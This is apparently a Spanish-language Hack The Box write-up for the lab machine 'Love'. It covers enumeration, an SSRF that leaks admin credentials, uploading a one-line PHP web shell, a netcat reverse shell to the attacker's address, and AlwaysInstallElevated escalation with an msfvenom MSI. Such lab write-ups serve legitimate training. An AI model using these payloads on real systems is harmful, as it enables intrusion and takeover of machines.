# HTB-Love `10.10.10.239`

*Server Side Request Forgery (SSRF)*

*Exploiting Voting System*

*Abusing AlwaysInstallElevated (msiexec/msi file)*

### Intrusión
Como siempre empezamos con nuestra sentencia nmap

```
nmap -p- --open -sCV -sS --min-rate 5000 -n -Pn -vvv 10.10.10.239 -oN Targeted
```
 
La página web aloja un formulario de voting system

![vote](/images/Voting.jpg)

El cual tiene ciertas vulnerabilidades

![searchsploit](/images/searchsploit.jpg)

No es vulnerable a SQL Injection, y en este caso el resto de exploits son con autenticación.

Podemos enumerar directorios y no llegaremos a mucha conclusión.

Si enumeramos subdominios con wfuzz, encontramos uno: `staging`

```
wfuzz -c -t 200 --hc=404 --hh=4388 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

![wfuzz](/images/wfuzz.jpg)

En ella encontramos un analizador de archivos.

Si introducimos nuestra URL podemos ver que escanea nuestra máquina poniéndonos en escucha

![nuestra](/images/nuestra.jpg)

`tcpdump -i tun0`

![tcpdump](/images/tcpdump.jpg)

Pero sin embargo no logramos gran cosa partiendo desde aquí, pero llegamos a la conclusión de que lo que hace es leer el contenido del servidor http que hemos creado… vamos a enumerar puertos que tiene abiertos la máquina a los cuales no nos dejaba entrar `(5000, 5986)`

Al escanear el puerto 5000, tenemos cosas interesantes

![creds](/images/creds.jpg)

Tenemos credenciales `admin: @LoveIsInTheAir!!!!`

Podemos volver a la página de login e iniciar sesión en /admin/login.php

![admin](/images/admin-login.jpg)

Investigando un poco la web, podemos ver que nos permite añadir votantes y adjuntar una imagen, que se sube al directorio /images
Bastante obvio, vamos a subir una Shell cmd de php

```
<?php system($_REQUEST['cmd']); ?>
```

![php](/images/shellphp.jpg)
 
![success](/images/success.jpg)

En el directorio /images, encontraremos nuestra Shell

![barra](/images/barraimages.jpg)
 
Y ya tenemos ejecución de comandos desde la barra de búsqueda.

![ejec](/images/ejecucion.jpg)
 
Introducimos una reverse shell de nc para Windows:

```
nc -e cmd 10.10.14.11 443
```

![nc](/images/nc.jpg)

Y obtenemos la Shell
 
![shell](/images/shell.jpg)
 

### Escalada de Privilegios

Los dos comandos usuales de whoami no nos arrojan mucha información

![whoami](/images/whoami.jpg)

Nos vamos a copiar el winpeas

![win1](/images/winpeas1.jpg)

![win2](/images/winpeas2.jpg)
 
Al Ejecutarlo, encontramos que AlwaysInstallElevated = 1

![allways](/images/Allways.jpg)

Vamos a crearnos un payload con msf venom

![msf](/images/msfvenom.jpg)

Y lo subimos a la máquina

![subimos](/images/subimos.jpg)

Lo ejecutamos con la siguiente sentencia:

```
msiexec /quiet /qn /i reverse.msi
```

![msi](/images/msiexec.jpg)

Y poniéndonos en escucha obtenemos una Shell de administrador, pudiendo obtener la root.txt y completar la máquina.

![ncroot](/images/ncroot.jpg)
 
 
